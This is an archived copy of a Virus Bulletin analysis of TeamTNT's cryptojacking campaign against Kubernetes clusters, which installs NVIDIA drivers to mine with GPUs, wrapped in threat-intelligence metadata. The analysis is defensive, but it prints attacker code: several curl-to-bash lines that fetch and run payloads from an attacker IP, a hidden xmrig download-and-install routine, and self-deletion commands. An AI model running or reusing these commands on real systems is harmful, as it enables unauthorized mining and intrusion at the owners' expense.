{
    "id": "9d248de2-522a-49d5-b438-9e4f5e4637ec",
    "created_at": "2023-01-12T15:05:59.16727Z",
    "updated_at": "2025-03-27T02:12:11.051622Z",
    "deleted_at": null,
    "sha1_hash": "d12c245b4200a327920a4aeb4cd67cdcc5fbb7fa",
    "title": "2022-04-23 - Cryptojacking on the Fly- TeamTNT Using NVIDIA Drivers to Mine Cryptocurrency",
    "authors": "",
    "file_creation_date": "2022-05-28T19:45:48Z",
    "file_modification_date": "2022-05-28T19:45:48Z",
    "file_size": 597285,
    "plain_text": "# Cryptojacking on the Fly: TeamTNT Using NVIDIA Drivers to Mine Cryptocurrency\n\n**[virusbulletin.com/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/](https://www.virusbulletin.com/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/)**\n\n### Aditya K Sood\n\n_Advanced Threat Research Center of Excellence, Office of the CTO, F5_\n\nTable of contents\n\nOverview\n\nUnderstanding the attack model: Kubernetes for cryptomining operations\n\nResearch analysis\n\nRemote server hosting packages\n\nDissecting NVIDIA installation scripts\n\nQuerying metadata server\n\nInstalling Linux kernel headers\n\nSelf deletion and file cleanup\n\nOS specific driver installation\n\nNVIDIA drivers deployment on Ubuntu\n\nNVIDIA drivers deployment on Debian\nNon GCS API support: direct downloading via HTTP\n\nInstalling cryptominer software\n\nInference\n\nReferences\n\n## Overview\n\nKubernetes deployments have been targeted by attackers as a means to compromise the\ncloud environment to control workloads and harness the power of the cloud to conduct\nunauthorized tasks. Earlier research has highlighted how the TeamTNT threat group\nconducts attacks against large-scale Kubernetes deployments [1]. TeamTNT is known for\nattacking insecure and vulnerable Kubernetes deployments in order to further enumerate\nthe cloud infrastructure [2] to infiltrate into organizations’ dedicated environments and\ntransform them into attack launchpads. In this article we present a new module introduced\nby TeamTNT to utilize NVIDIA’s GPU capabilities by installing associated drivers on\ncompromised pods running in cluster nodes to conduct advanced mining operations. For\nclarity, no security vulnerability in NVIDIA’s driver is exploited by TeamTNT.\n\n\n-----\n\n## Understanding the attack model: Kubernetes for cryptomining operations\n\nIt is important first to understand TeamTNT’s attack model before we can dissect its end-toend working. The details are presented in Figure 1.\n\nFigure 1: TeamTNT Kubernetes attack model.\n\nFigure 2 shows the complete workflow.\n\n\n-----\n\nFigure 2: Workflow.\n\nLet’s first look at the infection model:\n\n**Exploit the unsecured kubelet. It has recently been established that, due to**\ninsecure configuration and inherent vulnerabilities, attackers target the kubelet\ncomponent in Kubernetes installations.\n\nAs per the details provided in the Kubernetes documentation [3] the kubelet is:\n\n_‘... an agent that runs on each node [4] in the [Kubernetes] cluster. It makes sure that_\n_containers [5] are running in a Pod [6]._\n\n_‘The kubelet takes a set of PodSpecs that are provided through various mechanisms_\n_and ensures that the containers described in those PodSpecs are running and_\n_healthy. The kubelet doesn’t manage containers that were not created by Kubernetes.’_\n\nTeamTNT attacks exploit the default Kubernetes installation because the configured\nkubelet runs unsecured. As a result, anyone can authenticate the kubelet by default,\nbecause it runs with the anonymous-auth flag set to true.\n\n**Compromise configured pods in the node. Once the attacker has compromised the**\nkubelet, it starts to compromise configured pods in the nodes. To do this, the attacker\ntriggers remote command execution by exploiting privilege escalation flaws. For\nexample, to completely control one container (pod) in a node, the attacker first obtains\nroot privileges in that container. Once root privileges are established, the\ncompromised container is used to trigger lateral movement or target other containers\n(pods) in the node.\n\n**Download malicious payloads. Once a pod is compromised, the attacker downloads**\nmalicious payloads from a remote location to install advanced payloads or tools. This\nenables the attacker to have different tools available to use as per the requirements.\n\n**Update packages on compromised pods. The compromised pod environment is**\nenhanced by installing new packages such as NVIDIA drivers to enhance the GPU\ncapabilities. This helps the attackers to weaponize the compromised pod (container)\nand utilize the underlying hardware for their operations.\n\n**Execute cryptomining operations. Once the pod is updated with the installation of**\nadditional drivers, a cryptominer is activated and associated processes are started to\nconduct cryptomining operations. The enhanced power of the pod is utilized for\nmining, thereby passing the cost of mining to the owners of the cloud infrastructure.\n\n\n-----\n\n**Trigger C&C communication. The malicious code communicates with the C&C**\nserver and extracts sensitive data from the compromised pods.\n\n## Research analysis\n\nIn this section, we present more details about the use of NVIDIA drivers by TeamTNT.\n\n### Remote server hosting packages\n\nA remote server hosting different Kubernetes infection tools (scripts) and modules was\ndiscovered, as shown in Figure 3.\n\nFigure 3: Server hosting different Kubernetes infection tools (scripts) and modules.\n\nYou can see the different types of shell scripts listed in the directory. Installation scripts such\nas install-NVIDIA-drivers.sh and directory gpu were identified in the listed resources.\n\n\n-----\n\nFigure 4: Directory structure highlighting the presence of bash scripts.\n\nThe directory structure shown in Figure 4 highlights the presence of bash scripts, one of\nwhich was nvidia.sh.\n\n### Dissecting NVIDIA installation scripts\n\nThe nvidia.sh script was used to download the NVIDIA drivers and install them in order to\nenhance the power of the underlying hardware. Let’s analyse this script.\n\nFigure\n\n5: Nvidia.sh script.\n\n\n-----\n\nOn decoding the string using the base64 utility, the message NVIDIA Installer is displayed,\nas shown below.\n\nFigure 6: Message displayed on decoding the string.\n\nThe script fetches the following NVIDIA packages:\n\n**Package** **Description**\n\nnvidia- _This package is just an umbrella for a group of other packages, it has_\nheadless-450 _no description._\n\n[7]\n\n_Description samples from packages in group:_\n\n_NVIDIA binary OpenGL/GLX configuration library_\nShared files used by the NVIDIA libraries\n_NVIDIA lib compute package_\n_NVIDIA video decoding runtime libraries_\n\nnvidia-driver- _NVIDIA 450 series driver support_\n450\n\nnvidia- This package provides utility binaries for parallel general purpose\ncompute-utils- computing use cases with the NVIDIA driver\n450\n\nnvidia-cuda- _NVIDIA tools for debugging CUDA applications running on Linux and_\ntoolkit QNX\n\nAdditionally, a different variant of the script is presented.\n\n|Package|Description|\n|---|---|\n|nvidia- headless-450 [7]|This package is just an umbrella for a group of other packages, it has no description. Description samples from packages in group: NVIDIA binary OpenGL/GLX configuration library Shared files used by the NVIDIA libraries NVIDIA lib compute package NVIDIA video decoding runtime libraries|\n|nvidia-driver- 450|NVIDIA 450 series driver support|\n|nvidia- compute-utils- 450|This package provides utility binaries for parallel general purpose computing use cases with the NVIDIA driver|\n|nvidia-cuda- toolkit|NVIDIA tools for debugging CUDA applications running on Linux and QNX|\n\n\n-----\n\nFigure 7:\n\nDifferent variant of the script.\n\nLet’s dissect this script to obtain more information.\n\n### Querying metadata server\n\nThe installation script is designed to fetch metadata to install new modules and packages\non the compromised system. Every VM stores its metadata on a centralized metadata\nserver and has direct access without any additional authorization. The metadata is required\nfor installing new scripts and packages in an automated manner. In order to do this,\ninstallation scripts require additional VM information, which the metadata server provides.\nGenerally, the VM has access to the metadata by default. TeamTNT utilizes the following\nCURL command to query a metadata server from a compromised VM hosted in Google\n_Cloud:_\n\n\n-----\n\n```\nfunction get_metadata_value() {\n  curl --retry 5 \\\n    -s \\\n    -f \\\n    -H \"Metadata-Flavor: Google\" \\\n    \"http://metadata/computeMetadata/v1/$1\"\n}\nfunction get_attribute_value() {\n  get_metadata_value \"instance/attributes/$1\"\n}\n\n```\nIf you analyse the CURL command above, it sets the -H parameter with Metadata-Flavor:\nGoogle, a ‘key: value’ pair. The HTTP request header indicates to the metadata server that\nthe VM needs the metadata for specific operations, and the request does not originate from\nan insecure source. This strategy works efficiently because the VM is already compromised\nand the trust boundary is broken.\n\n### Installing Linux kernel headers\n\nA Linux distribution consists of a kernel, kernel header and extra modules. The kernel\nheaders are used to explicitly define the different device interfaces, highlighting how the\nfunction in the source files is defined. The kernel headers support the compilers in checking\nthat the usage of a function is legitimate and correct by verifying the function signature\n(return value and parameters) available in the header file. The script installs the Linux\nheaders package that provides the capability to use the kernel headers for a specific kernel\nversion (checking uname -a). The kernel headers provide interfaces to assist kernel\nmodules to communicate and access hardware. The kernel header installation code as\nutilized in the script is presented below:\n```\nfunction install_linux_headers() {\n  # Install linux headers. Note that the kernel version might be changed after\n  # installing the gvnic version. For example: 4.19.0-8-cloud-amd64 ->\n  # 4.19.0-9-cloud-amd64. So we install the kernel headers for each driver\n  # installation.\n  echo \"install linux headers: linux-headers-$(uname -r)\"\n  sudo apt install -y linux-headers-\"$(uname -r)\" || exit 1\n}\n\n### Self deletion and file cleanup\n\n```\nOnce the drivers are installed on the compromised system, the script has a self-deletion\nfeature to remove all traces of it from the system once it executes successfully. The\nfollowing command is executed:\n```\nrm -f nvidia.sh 2>/dev/null 1>/dev/null\n\n### OS specific driver installation\n\n```\n\n-----\n\nThe script can install drivers specific to the operating system by verifying the installed OS in\nthe pod (container). The main routine is presented below:\n```\nmain() {\n  install_linux_headers\n  # shellcheck source=/opt/deeplearning/driver-version.sh disable=SC1091\n  source \"${DL_PATH}/driver-version.sh\"\n  export DRIVER_GCS_PATH\n  # Custom GCS driver location via instance metadata.\n  DRIVER_GCS_PATH=$(get_attribute_value nvidia-driver-gcs-path)\n  if [[ \"${OS_IMAGE_FAMILY}\" == \"${OS_DEBIAN9}\" || \"${OS_IMAGE_FAMILY}\" ==\n\"${OS_DEBIAN10}\" ]]; then\n    install_driver_debian\n  elif [[ \"${OS_IMAGE_FAMILY}\" == \"${OS_UBUNTU1804}\" ]]; then\n    install_driver_ubuntu\n  fi\n\n### NVIDIA drivers deployment on Ubuntu\n\n```\nThe script uses function install_driver_ubuntu() to check and install the NVIDIA driver for\n_Ubuntu OS. The details are shown below:_\n\n\n-----\n\n```\n# For Ubuntu OS\nfunction install_driver_ubuntu() {\n  echo \"DRIVER_UBUNTU_DEB: ${DRIVER_UBUNTU_DEB}\"\n  echo \"DRIVER_UBUNTU_PKG: ${DRIVER_UBUNTU_PKG}\"\n  if [[ -z \"${DRIVER_GCS_PATH}\" ]]; then\n    DRIVER_GCS_PATH=\"gs://dl-platform-public-nvidia/${DRIVER_UBUNTU_DEB}\"\n  fi\n  echo \"Downloading driver from GCS location and install: ${DRIVER_GCS_PATH}\"\n  set +e\n  gsutil -q cp \"${DRIVER_GCS_PATH}\" \"${DRIVER_UBUNTU_DEB}\"\n  set -e\n  # Download driver via http if GCS failed.\n  if [[ ! -f \"${DRIVER_UBUNTU_DEB}\" ]]; then\n driver_url_path=\"https://developer.download.nvidia.com/compute/cuda/${DRIVER_UBUNTU_\n    download_driver_via_http \"${driver_url_path}\" \"${DRIVER_UBUNTU_DEB}\"\n  fi\n  if [[ ! -f \"${DRIVER_UBUNTU_DEB}\" ]]; then\n driver_url_path=\"https://us.download.nvidia.com/tesla/${DRIVER_VERSION}/${DRIVER_UBU\n    download_driver_via_http \"${driver_url_path}\" \"${DRIVER_UBUNTU_DEB}\"\n  fi\n  if [[ ! -f \"${DRIVER_UBUNTU_DEB}\" ]]; then\n    echo \"Failed to find drivers!\"\n    exit 1\n  fi\n  wget -nv\nhttps://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cudaubuntu1804.pin\n  sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600\n  dpkg -i \"${DRIVER_UBUNTU_DEB}\" || {\n    echo \"Failed to install ${DRIVER_UBUNTU_DEB}..exit\"\n    exit 1\n  }\n  apt-key add /var/cuda-repo-*/*.pub || apt-key add /var/nvidia-driver*/*.pub || {\n    echo \"Failed to add apt-key...exit\"\n    exit 1\n  }\n  sudo apt update\n  sudo apt remove -y \"${DRIVER_UBUNTU_PKG}\"\n  sudo apt -y autoremove && sudo apt install -y \"${DRIVER_UBUNTU_PKG}\"\n  rm -rf \"${DRIVER_UBUNTU_DEB}\" cuda-update1804.pin\n}\n\n### NVIDIA drivers deployment on Debian\n\n```\nThe script uses function install_driver_debian() to check and install the NVIDIA driver for\n_Debian OS. The details are shown below:_\n\n\n-----\n\n```\n# For Debian like OS\nfunction install_driver_debian() {\n  echo \"DRIVER_VERSION: ${DRIVER_VERSION}\"\n  local driver_installer_file_name=\"driver_installer.run\"\n  local nvidia_driver_file_name=\"NVIDIA-Linux-x86_64-${DRIVER_VERSION}.run\"\n  if [[ -z \"${DRIVER_GCS_PATH}\" ]]; then\n    DRIVER_GCS_PATH=\"gs://nvidia-drivers-us-public/tesla/${DRIVER_VERSION}\"\n  fi\n  local driver_gcs_file_path=${DRIVER_GCS_PATH}/${nvidia_driver_file_name}\n  echo \"Downloading driver from GCS location and install: ${driver_gcs_file_path}\"\n  set +e\n  gsutil -q cp \"${driver_gcs_file_path}\" \"${driver_installer_file_name}\"\n  set -e\n  # Download driver via http if GCS failed.\n  if [[ ! -f \"${driver_installer_file_name}\" ]]; then\n driver_url_path=\"http://us.download.nvidia.com/tesla/${DRIVER_VERSION}/${nvidia_driv\n    download_driver_via_http \"${driver_url_path}\"\n\"${driver_installer_file_name}\"\n  fi\n  if [[ ! -f \"${driver_installer_file_name}\" ]]; then\n    echo \"Failed to find drivers!\"\n    exit 1\n  fi\n  chmod +x ${driver_installer_file_name}\n  sudo ./${driver_installer_file_name} --dkms -a -s --no-drm --install-libglvnd\n  rm -rf ${driver_installer_file_name}\n}\n\n### Non GCS API support: direct downloading via HTTP\n\n```\nAnother functionality added to the installation script was to fetch the NVIDIA drivers directly\nfrom the Internet via an HTTP communication channel. This option is used by the attackers\nwhen GCA APIs cannot be used to fetch the drivers. One can consider this as a fallback\noption to installing NVIDIA drivers directly. The code highlighted below validates this:\n```\nfunction download_driver_via_http() {\n  local driver_url_path=$1\n  local downloaded_file=$2\n  echo \"Could not use Google Cloud Storage APIs to download drivers. Attempting to\ndownload them directly from Nvidia.\"\n  echo \"Downloading driver from URL: ${driver_url_path}\"\n  wget -nv \"${driver_url_path}\" -O \"${downloaded_file}\" || {\n    echo 'Download driver via Web failed!' &&\n    rm -f \"${downloaded_file}\" &&\n    echo \"${downloaded_file} deleted\"\n  }\n}\n\n### Installing cryptominer software\n\n```\nThe init.sh file fetches the different Kubernetes payloads, which are downloaded using the\ncurl command from the remote host to the compromised pod, as shown below:\n\n\n-----\n\n```\n# curl http://45.9.148.XXX/cmd/init.sh | bash\ncurl http://45.9.148.XXX/cmd/Kubernetes_root_PayLoad_1.sh | bash\ncurl http://45.9.148.XXX/cmd/Kubernetes_root_PayLoad_2.sh | bash\n\n```\nThe code shown below highlights how TeamTNT installed a cryptominer on the\ncompromised pod running in the active node of the Kubernetes cluster. The module reflects\nhow the xmrig.tgz file is downloaded and the cryptominer is installed on the compromised\npod. The function is a part of the Kubernetes_temp_PayLoad_2.sh file, which defines\ndifferent payloads to be installed.\n\n\n-----\n\n```\nfunction DOWNLOAD_FILE(){\necho \"[*] Downloading advanced xmrig to /usr/sbin/.configure/xmrig.tar.gz\"\nif type wget 2>/dev/null 1>/dev/null; then wget -q $XMR_1_BIN_URL -O\n/usr/sbin/.configure/xmrig.tar.gz\nelif type wd1 2>/dev/null 1>/dev/null; then wd1 -q $XMR_1_BIN_URL -O\n/usr/sbin/.configure/xmrig.tar.gz\nelif type wdl 2>/dev/null 1>/dev/null; then wdl -q $XMR_1_BIN_URL -O\n/usr/sbin/.configure/xmrig.tar.gz\nelif type curl 2>/dev/null 1>/dev/null; then curl -s $XMR_1_BIN_URL -o\n/usr/sbin/.configure/xmrig.tar.gz\nelif type cd1 2>/dev/null 1>/dev/null; then cd1 -s $XMR_1_BIN_URL -o\n/usr/sbin/.configure/xmrig.tar.gz\nelif type cdl 2>/dev/null 1>/dev/null; then cdl -s $XMR_1_BIN_URL -o\n/usr/sbin/.configure/xmrig.tar.gz\nelif type bash 2>/dev/null 1>/dev/null; then C_hg_DLOAD $XMR_1_BIN_URL >\n/usr/sbin/.configure/xmrig.tar.gz\nfi\ntar -xvf /usr/sbin/.configure/xmrig.tar.gz -C /usr/sbin/.configure/ 2>/dev/null\nrm -f /usr/sbin/.configure/xmrig.tar.gz 2>/dev/null 1>/dev/null\nchmod +x /usr/sbin/.configure/xmrig\nif [ -f \"/usr/sbin/.configure/xmrigMiner\" ];then chmod +x\n/usr/sbin/.configure/xmrigMiner; fi\n/usr/sbin/.configure/xmrig -h 2>/dev/null 1>/dev/null\nCHECK_XMRIG=$?\nif [[ \"$CHECK_XMRIG\" != \"0\" ]]; then\nif [ -f /usr/sbin/.configure/xmrig ]\nthen echo \"WARNING: /usr/sbin/.configure/xmrig is not functional\"\nif [ -f \"/usr/sbin/.configure/xmrig\" ];then rm -f /usr/sbin/.configure/xmrig; fi\nif [ -f \"/usr/sbin/.configure/xmrigMiner\" ];then rm -f\n/usr/sbin/.configure/xmrigMiner; fi\nelse\necho \"WARNING: /usr/sbin/.configure/xmrig was removed\"\nif [ -f \"/usr/sbin/.configure/xmrigMiner\" ];then rm -f\n/usr/sbin/.configure/xmrigMiner; fi\nfi\n# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n—-- Truncated —\ntar -xvf /usr/sbin/.configure/xmrig.tar.gz -C /usr/sbin/.configure/ 2>/dev/null\nrm -f /usr/sbin/.configure/xmrig.tar.gz 2>/dev/null 1>/dev/null\nchmod +x /usr/sbin/.configure/xmrig\nif [ -f \"/usr/sbin/.configure/xmrigMiner\" ];then chmod +x\n/usr/sbin/.configure/xmrigMiner; fi\n/usr/sbin/.configure/xmrig -h 2>/dev/null 1>/dev/null\nCHECK_XMRIG=$?\nif [[ \"$CHECK_XMRIG\" != \"0\" ]]; then\nif [ -f /usr/sbin/.configure/xmrig ]\nthen echo \"WARNING: /usr/sbin/.configure/xmrig is not functional\"\nif [ -f \"/usr/sbin/.configure/xmrig\" ];then rm -f /usr/sbin/.configure/xmrig; fi\nif [ -f \"/usr/sbin/.configure/xmrigMiner\" ];then rm -f\n/usr/sbin/.configure/xmrigMiner; fi\nelse\necho \"WARNING: /usr/sbin/.configure/xmrig was removed\"\nif [ -f \"/usr/sbin/.configure/xmrigMiner\" ];then rm -f\n/usr/sbin/.configure/xmrigMiner; fi\nfi\n\n```\n\n-----\n\n```\nrm f k32r.sh 2>/dev/null\nexit\nfi\nfi\necho \"[*] Miner /usr/sbin/.configure/xmrig is OK\"\n}\n\n```\nThe complete details presented above highlight how TeamTNT harnesses the power of\nNVIDIA GPU capabilities to trigger cryptojacking operations.\n\n## Inference\n\n_NVIDIA’s inherently powerful GPU capabilities are utilized by the attackers to mine_\ncryptocurrency illegally on compromised cloud infrastructure and pass the cloud costs to the\ncompromised organizations. As discussed earlier, in this attack TeamTNT is not exploiting\nany vulnerability in the NVIDIA drivers, rather utilizing them for cryptomining operations in\nan unauthorized manner. The attackers reap benefits from the compromised cloud\ninfrastructure. This complete cryptojacking attack involves the installation of the\ncryptomining code stealthily on compromised cloud infrastructure (pods running in nodes\nhosted in Kubernetes clusters) to mine cryptocurrency by executing unauthorized\noperations. Organizations are at significant risks from cryptojacking and should put\nmeasures in place to avoid such attacks.\n\n## References\n\n[1] Logan, M.; Fiser, D. TeamTNT Targets Kubernetes, Nearly 50,000 IPs Compromised in\nWorm-like Attack. Trend Micro. May 2021.\nhttps://www.trendmicro.com/en_us/research/21/e/teamtnt-targets-kubernetes--nearly-50000-ips-compromised.html.\n\n[2] Quist, N. TeamTNT Actively Enumerating Cloud Environments to Infiltrate Organizations.\nTrend Micro. June 2021. https://unit42.paloaltonetworks.com/teamtnt-operations-cloudenvironments/.\n\n[[3] Kubernetes Components. https://kubernetes.io/docs/concepts/overview/components/.](https://kubernetes.io/docs/concepts/overview/components/)\n\n[4] Nodes. [https://kubernetes.io/docs/concepts/architecture/nodes/.](https://kubernetes.io/docs/concepts/architecture/nodes/)\n\n[[5] Containers. https://kubernetes.io/docs/concepts/containers/.](https://kubernetes.io/docs/concepts/containers/)\n\n[6] Pods. [https://kubernetes.io/docs/concepts/workloads/pods/.](https://kubernetes.io/docs/concepts/workloads/pods/)\n\n[7] Package “nvidia-headless-450-server”. Ubuntu Updates.\nhttps://www.ubuntuupdates.org/package/core/focal/restricted/updates/nvidia-headless-450server.\n\n\n-----\n\n## Latest articles:\n\n### Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency\n\nTeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order\nto infiltrate organizations’ dedicated environments and transform them into attack\nlaunchpads. In this article Aditya Sood presents a new module introduced by…\n\n### Collector-stealer: a Russian origin credential and information extractor\n\nCollector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to\nexfiltrate sensitive data from end-user systems and store it in its C&C panels. In this article,\nresearchers Aditya K Sood and Rohit Chaturvedi present a 360…\n\n### Fighting Fire with Fire\n\nIn 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and\nfrom that moment onward, was intrigued by the properties of these small pieces of selfreplicating code. Joe Wells was an expert on computer viruses, was partly…\n\n### Run your malicious VBA macros anywhere!\n\nKurt Natvig wanted to understand whether it’s possible to recompile VBA macros to another\nlanguage, which could then easily be ‘run’ on any gateway, thus revealing a sample’s true\nnature in a safe manner. In this article he explains how he recompiled…\n\n### Dissecting the design and vulnerabilities in AZORult C&C panels\n\nAditya K Sood looks at the command-and-control (C&C) design of the AZORult malware,\ndiscussing his team's findings related to the C&C design and some security issues they\nidentified during the research.\n\n[Bulletin Archive](https://www.virusbulletin.com/virusbulletin/archive)\n\nWe have placed cookies on your device in order to improve the functionality of this site, as\n[outlined in our cookies policy. However, you may delete and block all cookies from this site](https://www.virusbulletin.com/about-vb/privacy-policy/cookies)\nand your use of the site will be unaffected. By continuing to browse this site, you are\n[agreeing to Virus Bulletin's use of data as outlined in our privacy policy.](https://www.virusbulletin.com/about-vb/privacy-policy/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-04-23 - Cryptojacking on the Fly- TeamTNT Using NVIDIA Drivers to Mine Cryptocurrency.pdf"
    ],
    "report_names": [
        "2022-04-23 - Cryptojacking on the Fly- TeamTNT Using NVIDIA Drivers to Mine Cryptocurrency.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f809bfcb-b200-4988-80a8-be78ef6a52ef",
            "created_at": "2023-01-06T13:46:39.186988Z",
            "updated_at": "2025-03-27T02:00:03.016358Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "Adept Libra"
            ],
            "source_name": "MISPGALAXY:TeamTNT",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c3ca592f-0669-49bd-ab5c-310007ab2fb4",
            "created_at": "2022-10-25T15:50:23.334495Z",
            "updated_at": "2025-03-27T02:00:55.445098Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "TeamTNT"
            ],
            "source_name": "MITRE:TeamTNT",
            "tools": [
                "Peirates",
                "MimiPenguin",
                "LaZagne",
                "Hildegard"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535959,
    "ts_updated_at": 1743041531,
    "ts_creation_date": 1653767148,
    "ts_modification_date": 1653767148,
    "files": {
        "pdf": "https://archive.orkl.eu/d12c245b4200a327920a4aeb4cd67cdcc5fbb7fa.pdf",
        "text": "https://archive.orkl.eu/d12c245b4200a327920a4aeb4cd67cdcc5fbb7fa.txt",
        "img": "https://archive.orkl.eu/d12c245b4200a327920a4aeb4cd67cdcc5fbb7fa.jpg"
    }
}